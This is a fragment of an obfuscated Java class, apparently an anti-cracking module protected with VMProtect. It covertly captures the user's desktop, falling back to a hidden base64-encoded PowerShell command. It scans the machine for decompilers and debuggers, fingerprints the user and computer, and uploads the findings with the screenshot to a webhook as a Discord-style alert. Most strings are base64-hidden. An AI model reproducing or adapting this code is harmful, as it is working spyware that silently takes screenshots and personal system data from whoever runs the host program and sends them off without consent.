    @Native(type = Native.Type.VMProtectBeginMutation)
    private boolean isAlreadyAdded(String tool) {
        String tl = tool.toLowerCase();
        for (String s : s1) {
            if (s.toLowerCase().contains(tl) || tl.contains(s.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private boolean containsTool(String tool) {
        String tl = tool.toLowerCase();
        for (String s : s1) {
            if (s.toLowerCase().contains(tl) || tl.contains(s.toLowerCase())) {
                return true;
            }
        }
        for (String s : s2) {
            if (s.toLowerCase().contains(tl) || tl.contains(s.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private String t1() {
        String[] ST = gST();
        StringBuilder sb = new StringBuilder();

        if (s1.isEmpty() && s2.isEmpty()) {
            return ST[4];
        }

        for (String t : s1) {
            sb.append(ST[2]).append(t).append(ST[0]).append("\n");
        }

        for (String t : s2) {
            boolean found = false;
            for (String running : s1) {
                if (running.toLowerCase().contains(t.toLowerCase()) || t.toLowerCase().contains(running.toLowerCase())) {
                    found = true;
                    break;
                }
            }
            if (!found) {
                sb.append(ST[3]).append(t).append(ST[1]).append("\n");
            }
        }

        String rs = sb.toString().trim();
        if (rs.length() > 1000) {
            rs = rs.substring(0, 997) + "...";
        }
        return rs;
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private byte[] c1() {
        try {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();

            Rectangle totalBounds = new Rectangle();
            for (GraphicsDevice screen : screens) {
                Rectangle bounds = screen.getDefaultConfiguration().getBounds();
                totalBounds = totalBounds.union(bounds);
            }

            Robot rb = new Robot();
            BufferedImage fullCapture = new BufferedImage(totalBounds.width, totalBounds.height, BufferedImage.TYPE_INT_RGB);
            Graphics2D g = fullCapture.createGraphics();

            for (GraphicsDevice screen : screens) {
                Rectangle bounds = screen.getDefaultConfiguration().getBounds();
                BufferedImage screenCapture = rb.createScreenCapture(bounds);
                g.drawImage(screenCapture, bounds.x - totalBounds.x, bounds.y - totalBounds.y, null);
            }
            g.dispose();

            ByteArrayOutputStream bs = new ByteArrayOutputStream();
            javax.imageio.ImageIO.write(fullCapture, d("anBn"), bs);
            return bs.toByteArray();
        } catch (Exception e) {
            return c3();
        }
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private byte[] c3() {
        String[] CM = gCM();
        File tf = null;
        try {
            String td = System.getProperty(d("amF2YS5pby50bXBkaXI="));
            tf = new File(td, d("anZtXw==") + System.nanoTime() + d("LnRtcA=="));

            String sc = d("JEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZSc7") +
                    d("QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3Jtczs=") +
                    d("QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZzs=") +
                    d("JHNjcmVlbnM9W1N5c3RlbS5XaW5kb3dzLkZvcm1zLlNjcmVlbl06OkFsbFNjcmVlbnM7") +
                    d("JG1pblg9KCRzY3JlZW5zfCV7JF8uQm91bmRzLlh9fE1lYXN1cmUgLU1pbikuTWluaW11bTs=") +
                    d("JG1pblk9KCRzY3JlZW5zfCV7JF8uQm91bmRzLll9fE1lYXN1cmUgLU1pbikuTWluaW11bTs=") +
                    d("JG1heFg9KCRzY3JlZW5zfCV7JF8uQm91bmRzLlgrJF8uQm91bmRzLldpZHRofXxNZWFzdXJlIC1NYXgpLk1heGltdW07") +
                    d("JG1heFk9KCRzY3JlZW5zfCV7JF8uQm91bmRzLlkrJF8uQm91bmRzLkhlaWdodH18TWVhc3VyZSAtTWF4KS5NYXhpbXVtOw==") +
                    d("JHc9JG1heFgtJG1pblg7JGg9JG1heFktJG1pblk7") +
                    d("JGJtcD1OZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkJpdG1hcCgkdywkaCk7") +
                    d("JGc9W1N5c3RlbS5EcmF3aW5nLkdyYXBoaWNzXTo6RnJvbUltYWdlKCRibXApOw==") +
                    d("JGcuQ29weUZyb21TY3JlZW4oJG1pblgsJG1pblksMCwwLFtTeXN0ZW0uRHJhd2luZy5TaXplXTo6bmV3KCR3LCRoKSk7") +
                    "$bmp.Save('" + tf.getAbsolutePath().replace("\\", "\\\\") + "',[System.Drawing.Imaging.ImageFormat]::Png);" +
                    d("JGcuRGlzcG9zZSgpOyRibXAuRGlzcG9zZSgp");

            String enc = Base64.getEncoder().encodeToString(sc.getBytes(StandardCharsets.UTF_16LE));

            ProcessBuilder pb = new ProcessBuilder(
                    CM[1], "/c", d("c3RhcnQgL21pbiAvYg==") + " " + d("cG93ZXJzaGVsbA==") + " -NoP -NonI -W Hidden -Enc " + enc
            );
            pb.redirectErrorStream(true);
            pb.environment().put(d("X19DT01QQVRfTEFZRVI="), d("UnVuQXNJbnZva2Vy"));
            Process pr = pb.start();
            pr.getInputStream().readAllBytes();
            pr.waitFor();

            Thread.sleep(800);

            if (tf.exists() && tf.length() > 0) {
                byte[] dt = Files.readAllBytes(tf.toPath());
                tf.delete();
                return dt;
            }
        } catch (Exception ignored) {
        } finally {
            if (tf != null && tf.exists()) {
                tf.delete();
            }
        }
        return null;
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private void n1(R r, byte[] ss) {
        try {
            String[] ST = gST();
            String[] PH = gPH();
            String[] LV = gLV();
            String[] EM = gEM();

            StringBuilder eb = new StringBuilder();
            for (String ev : r.l1) {
                eb.append(ST[3]).append(ev).append("\n");
            }
            String et = eb.toString().trim();
            if (et.isEmpty()) {
                et = ST[5];
            }
            if (et.length() > 500) {
                et = et.substring(0, 497) + "...";
            }

            String ts = t1();

            int cl;
            String li;
            String ct;
            String phaseText;
            boolean shouldPing;

            if (r.phase == 1) {
                phaseText = PH[0];
            } else {
                phaseText = PH[1];
            }

            if (r.v1 >= 100) {
                cl = 16711680;
                li = LV[0];
                ct = LV[6];
                shouldPing = true;
            } else if (r.v1 >= 50) {
                cl = 16744448;
                li = LV[2];
                ct = LV[6];
                shouldPing = true;
            } else {
                cl = 65280;
                li = LV[4];
                ct = "";
                shouldPing = false;
            }

            StringBuilder js = new StringBuilder();
            js.append("{");
            if (shouldPing && !ct.isEmpty()) {
                js.append("\"").append(d("Y29udGVudA==")).append("\":\"<@").append(k2()).append("> <@").append(k3()).append("> ").append(ct).append("\",");
            }
            js.append("\"").append(d("ZW1iZWRz")).append("\":[{");
            js.append("\"").append(d("dGl0bGU=")).append("\":\"").append(phaseText).append(" | ").append(li).append("\",");
            js.append("\"").append(d("Y29sb3I=")).append("\":").append(cl).append(",");
            js.append("\"").append(d("ZmllbGRz")).append("\":[");

            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[0]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(phaseText).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[1]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.u1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[2]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.i1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[3]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.r1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[4]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.h1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[14]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.s)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[5]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.b1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[6]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(r.v1).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[7]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(r.t1.format(DateTimeFormatter.ofPattern(d("ZGQuTU0ueXl5eSBISDptbTpzcw==")))).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[8]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.p1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[9]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.o1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[10]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.j1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[11]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(et)).append("```\",\"").append(d("aW5saW5l")).append("\":false},");
            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[12]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(ts)).append("```\",\"").append(d("aW5saW5l")).append("\":false}");

            js.append("],");
            js.append("\"").append(d("Zm9vdGVy")).append("\":{\"").append(d("dGV4dA==")).append("\":\"").append(EM[13]).append("\"},");
            js.append("\"").append(d("dGltZXN0YW1w")).append("\":\"").append(java.time.Instant.now().toString()).append("\"");
            js.append("}]}");

            if (ss != null && ss.length > 0) {
                h2(ss, d("cy5qcGc="), js.toString());
            } else {
                h1(js.toString());
            }

        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void h1(String js) {
        try {
            URL u = new URL(k1());
            HttpURLConnection cn = (HttpURLConnection) u.openConnection();
            cn.setRequestMethod(d("UE9TVA=="));
            cn.setRequestProperty(d("Q29udGVudC1UeXBl"), d("YXBwbGljYXRpb24vanNvbjsgY2hhcnNldD1VVEYtOA=="));
            cn.setRequestProperty(d("VXNlci1BZ2VudA=="), d("SmF2YS9SdW50aW1l"));
            cn.setDoOutput(true);
            cn.setConnectTimeout(10000);
            cn.setReadTimeout(10000);

            try (OutputStream os = cn.getOutputStream()) {
                os.write(js.getBytes(StandardCharsets.UTF_8));
            }

            cn.getResponseCode();
            cn.disconnect();
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void h2(byte[] fd, String fn, String payload) {
        try {
            String bd = "----FB" + System.nanoTime();
            String cr = "\r\n";

            URL u = new URL(k1());
            HttpURLConnection cn = (HttpURLConnection) u.openConnection();
            cn.setRequestMethod(d("UE9TVA=="));
            cn.setRequestProperty(d("Q29udGVudC1UeXBl"), d("bXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9") + bd);
            cn.setRequestProperty(d("VXNlci1BZ2VudA=="), d("SmF2YS9SdW50aW1l"));
            cn.setDoOutput(true);
            cn.setConnectTimeout(15000);
            cn.setReadTimeout(15000);

            ByteArrayOutputStream bs = new ByteArrayOutputStream();

            bs.write(("--" + bd + cr).getBytes());
            bs.write((d("Q29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJwYXlsb2FkX2pzb24i") + cr).getBytes());
            bs.write((d("Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29u") + cr + cr).getBytes());
            bs.write(payload.getBytes(StandardCharsets.UTF_8));
            bs.write(cr.getBytes());

            bs.write(("--" + bd + cr).getBytes());
            bs.write((d("Q29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlc1swXSI7IGZpbGVuYW1lPSI=") + fn + "\"" + cr).getBytes());
            bs.write((d("Q29udGVudC1UeXBlOiBpbWFnZS9qcGVn") + cr + cr).getBytes());
            bs.write(fd);
            bs.write(cr.getBytes());

            bs.write(("--" + bd + "--" + cr).getBytes());

            byte[] rb = bs.toByteArray();

            try (OutputStream os = cn.getOutputStream()) {
                os.write(rb);
                os.flush();
            }

            cn.getResponseCode();
            cn.disconnect();

        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m4() {
        String[] C2 = gC2();
        String[] PT = gPT();
        String[] PN = gPN();
        String[] sp = {
                System.getProperty(PT[0]),
                System.getenv(PT[1]),
                System.getenv(PT[2]),
                System.getProperty(PT[0]) + PT[3],
                System.getProperty(PT[0]) + PT[4],
                PT[5] + PT[6],
                PT[5] + PT[7]
        };
        for (String bp : sp) {
            if (bp == null) continue;
            File bd = new File(bp);
            if (!bd.exists()) continue;
            File[] fs = bd.listFiles();
            if (fs == null) continue;
            for (File f : fs) {
                if (!f.isDirectory()) continue;
                String nm = f.getName().toLowerCase();
                for (String ex : C2) {
                    if (nm.contains(ex.toLowerCase())) {
                        String formatted = formatToolName(ex);
                        if (!containsTool(ex)) {
                            s2.add(formatted);
                        }
                        a1(PN[3] + f.getName(), 20);
                    }
                }
            }
        }
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m5() {
        String[] C3 = gC3();
        String[] PT = gPT();
        String[] PN = gPN();
        String[] sp = {
                System.getProperty(PT[0]) + PT[3],
                System.getProperty(PT[0]) + PT[4],
                System.getProperty(PT[0])
        };
        for (String bp : sp) {
            if (bp == null) continue;
            try {
                java.nio.file.Files.walk(java.nio.file.Paths.get(bp), 3)
                        .filter(java.nio.file.Files::isRegularFile)
                        .forEach(pt -> {
                            String nm = pt.getFileName().toString().toLowerCase();
                            for (String ex : C3) {
                                if (nm.contains(ex.toLowerCase())) {
                                    String tn = ex.split("\\.")[0].split("-")[0];
                                    String formatted = formatToolName(tn);
                                    if (!containsTool(tn)) {
                                        s2.add(formatted);
                                    }
                                    a1(PN[4] + pt.getFileName(), 25);
                                }
                            }
                            if (nm.contains(d("cmljbg==")) && nm.endsWith(d("LmphdmE="))) {
                                a1(PN[10] + pt.getFileName(), 50);
                            }
                        });
            } catch (Exception ignored) {}
        }
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m6() {
        try {
            String[] C4 = gC4();
            String[] PN = gPN();
            String ar = java.lang.management.ManagementFactory
                    .getRuntimeMXBean()
                    .getInputArguments()
                    .toString()
                    .toLowerCase();
            for (String ex : C4) {
                if (ar.contains(ex.toLowerCase())) {
                    a1(PN[7] + ex, 40);
                }
            }
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m7() {
        try {
            String[] PN = gPN();
            if (java.lang.management.ManagementFactory
                    .getRuntimeMXBean()
                    .getInputArguments()
                    .stream()
                    .anyMatch(a -> a.contains(d("amR3cA==")))) {
                a1(PN[8], 50);
            }
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m8() {
        try {
            String[] PN = gPN();
            String cp = System.getProperty(d("amF2YS5jbGFzcy5wYXRo"));
            if (cp == null) return;
            String lw = cp.toLowerCase();
            String[] ss = {d("cmVjYWY="), d("amFkeA=="), d("Ynl0ZWNvZGU="), d("ZGVjb21waWw="), d("ZmVybmZsb3dlcg=="), d("cHJvY3lvbg=="), d("Y2Zy")};
            for (String s : ss) {
                if (lw.contains(s)) {
                    a1(PN[6] + s, 45);
                }
            }
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m9() {
        try {
            String[] PN = gPN();
            Map<String, String> ev = System.getenv();
            for (Map.Entry<String, String> en : ev.entrySet()) {
                String ky = en.getKey().toLowerCase();
                String vl = en.getValue().toLowerCase();
                if (ky.equals(d("amF2YV90b29sX29wdGlvbnM=")) || ky.equals(d("X2phdmFfb3B0aW9ucw=="))) {
                    if (vl.contains(d("YWdlbnQ=")) || vl.contains(d("ZGVidWc=")) || vl.contains(d("amR3cA=="))) {
                        a1(PN[9] + ky, 60);
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private void m10() {
        try {
            String[] PT = gPT();
            String[] PN = gPN();
            String rp = System.getenv(PT[1]) + PT[8];
            File rd = new File(rp);
            if (!rd.exists()) return;
            File[] fs = rd.listFiles();
            if (fs == null) return;
            for (File f : fs) {
                String nm = f.getName().toLowerCase();
                if (nm.contains(d("cmVjYWY=")) || nm.contains(d("amFkeA==")) ||
                        nm.contains(d("Ynl0ZWNvZGU=")) || nm.contains(d("ZGVjb21waWw="))) {
                    a1(PN[5] + f.getName(), 15);
                }
            }
        } catch (Exception ignored) {}
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private synchronized void a1(String ev, int pt) {
        if (!l1.contains(ev)) {
            l1.add(ev);
            v1 += pt;
        }
    }

    @Native(type = Native.Type.VMProtectBeginMutation)
    private static String j1(String tx) {
        if (tx == null) return d("Ti9B");
        return tx
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String d(String b) {
        try {
            return new String(Base64.getDecoder().decode(b), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return "";
        }
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    private static String[] e(String[] a) {
        String[] r = new String[a.length];
        for (int i = 0; i < a.length; i++) {
            r[i] = d(a[i]);
        }
        return r;
    }

    @Native(type = Native.Type.VMProtectBeginUltra)
    public static String g1() {
        try {
            String th = System.getProperty(d("dXNlci5uYW1l")) +
                    System.getProperty(d("b3MubmFtZQ==")) +
                    System.getenv(d("UFJPQ0VTU09SX0lERU5USUZJRVI=")) +
                    System.getenv(d("Q09NUFVURVJOQU1F"));
            MessageDigest md = MessageDigest.getInstance(d("U0hBLTI1Ng=="));
            byte[] hs = md.digest(th.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : hs) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString().substring(0, 32);
        } catch (Exception e) {
            return d("Ti9B");
        }
    }

    public static class R {
        public int v1;
        public List<String> l1;
        public Set<String> s1;
        public Set<String> s2;
        public LocalDateTime t1;
        public String u1;
        public String h1;
        public String r1;
        public String i1;
        public String b1;
        public String o1;
        public String j1;
        public String p1;
        public int phase;
        public String s;
    }
}